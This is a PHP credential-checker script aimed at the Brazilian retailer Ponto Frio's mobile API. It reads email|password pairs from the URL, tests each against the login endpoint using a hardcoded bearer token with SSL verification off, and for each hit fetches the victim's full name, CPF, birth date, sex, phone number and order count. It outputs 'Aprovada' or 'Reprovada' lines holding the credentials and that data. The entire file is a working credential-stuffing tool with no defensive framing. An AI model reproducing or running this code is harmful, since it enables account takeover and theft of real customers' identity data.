<?php
error_reporting(0);
set_time_limit(0);

$get = $_GET['list'];
$split = explode("|",$get);
$email = $split[0];
$pwd = $split[1];

function sm($string, $start, $end,$num) {
    $str = explode($start, $string);
    $str = explode($end, $str[$num]);
    return $str[0];
}

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mobile-b2c.pontofrio.com.br/token');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiI0NmVmNzliMi0yZGJhLTQ4YjItYmRjZi1iMDQxMTE5OTI3NDciLCJDb29raWUiOiJJUEktcG9udG9mcmlvLmNvbT1Vc3VhcmlvR1VJRD0zZDZiMWY0NC03ZTI2LTRjZTktYTg3NS1hYjJiNTBiNThmZWMiLCJVc2VyVHlwZSI6IkdVRVNUIiwiZXhwIjoxNTY0NjY1NDU3LCJpc3MiOiJodHRwczovL21vYmlsZS1iMmMucG9udG9mcmlvLmNvbS5iciIsImF1ZCI6IkFwcC5Qb250b0ZyaW8ifQ.9cFG6Q16c2IzftlgURPCi7hioN0OOPqgi9kOH60qYlk',
'Content-Type: application/json; charset=UTF-8',
'Host: mobile-b2c.pontofrio.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.9.1'
,));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"grantType":"Password","email":"'.$email.'","senha":"'.$pwd.'","textoCaptcha":""}');
$data = curl_exec($ch);

$token = getStr($data, 'accessToken":"','"');
if(strpos($data, 'accessToken')){

curl_setopt($ch, CURLOPT_URL, 'https://mobile-b2c.pontofrio.com.br/conta/pf');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'Authorization: Bearer '.$token,
'Host: mobile-b2c.pontofrio.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.9.1'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data1 = curl_exec($ch);



curl_setopt($ch, CURLOPT_URL, 'https://mobile-b2c.pontofrio.com.br/pedidos?Canal=2&Pagina=1&RegistrosPorPagina=10');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch,CURLOPT_HTTPHEADER,array(
'Authorization: Bearer '.$token,
'Host: mobile-b2c.pontofrio.com.br',
'Connection: Keep-Alive',
'Accept-Encoding: gzip',
'User-Agent: okhttp/3.9.1'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$data2 = curl_exec($ch);



$nome = getStr($data1, 'nomeCompleto":"','"');
$datan = getStr($data1, 'dataNascimento":"','"');
$cpf = getStr($data1, 'cpf":"','"');
$telefone = getStr($data1, 'telefone":"','"');
$sexo = getStr($data1, 'sexo":"','"');
$pedidos = getStr($data2, 'totalRegistros":',',');





$msg = "✔️Aprovada ".$email."|".$pwd." | Nome: ".$nome." | CPF: ".$cpf." | Data de Nascimento: ".$datan." | Sexo: ".$sexo." | Telefone: ".$telefone." | Pedidos: ".$pedidos." | @alex"; 

}
else{
	$msg = "Reprovada ".$email."|".$pwd."| @alex";
}

echo $msg;

?>